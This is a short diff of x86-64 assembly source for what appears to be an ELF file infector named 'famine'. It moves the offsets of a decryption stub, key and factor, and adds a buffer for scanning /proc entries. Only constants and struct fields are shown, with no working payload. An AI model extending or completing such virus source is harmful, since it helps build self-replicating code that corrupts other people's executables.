@@ -45,9 +45,9 @@
 %define JMP					0xe9
 %define EHDR_SIZE			64
 %define PHDR_SIZE			56
-%define KEY_OFFSET			143
-%define FACTOR_OFFSET		179
-%define JUMP_DECYPHER_OFFSET 138
+%define JUMP_DECYPHER_OFFSET 492
+%define KEY_OFFSET			497
+%define FACTOR_OFFSET		533
 
 ; MACROS
 %macro PUSH 0
@@ -192,6 +192,7 @@
 
 	struc	famine
 .dirents		resb	DIRENT_ARR_SIZE	; Array of dirents
+.dirents_proc	resb	DIRENT_ARR_SIZE	; Array of dirents for /proc
 .dir_fd			resq	1				; Directory fd
 .file_path		resb	PATH_MAX		; File path Buffer
 .new_dir		resb	PATH_MAX
